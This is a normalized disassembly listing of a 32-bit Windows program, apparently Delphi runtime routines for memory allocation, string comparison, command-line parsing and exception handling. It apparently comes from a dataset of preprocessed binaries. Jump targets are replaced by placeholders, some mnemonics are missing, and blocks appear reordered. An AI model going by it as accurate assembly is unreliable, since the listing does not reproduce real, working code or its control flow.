mov edx [ eax + 0x8 ]
add ebx edx
call sub_401ba0
sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405cfc
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405cfc
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405cfc
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405cfc
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4045dc
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403f90
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404080
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a68
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402aa8
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402afc
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b54
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402b70
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bf4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c64
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c84
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d64
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402da4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e57 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e57 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e57
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403090
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030c0
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403131
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_4031bc
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403264
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032bc
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4049c0
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032dc
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4055e4
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40330c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403390
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033a0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403397
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032dc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4055e4
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033a0
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033e4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_40346c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403424
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403454
push eax
push ecx
mov eax [ eax ]
call sub_403424
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f84
call [ rw-data ]
sub_40349c
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403424
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034c4
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_403514
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_403564
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_40358d
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_4035f8
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_403634
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403648
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_40365c
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_40367c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_40365c
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036e0
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403184
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405cfc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403648
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_4035f8
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40380c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403184
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_4035f8
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405cfc
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_403634
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bf4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403994
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_40367c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_4039cc
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
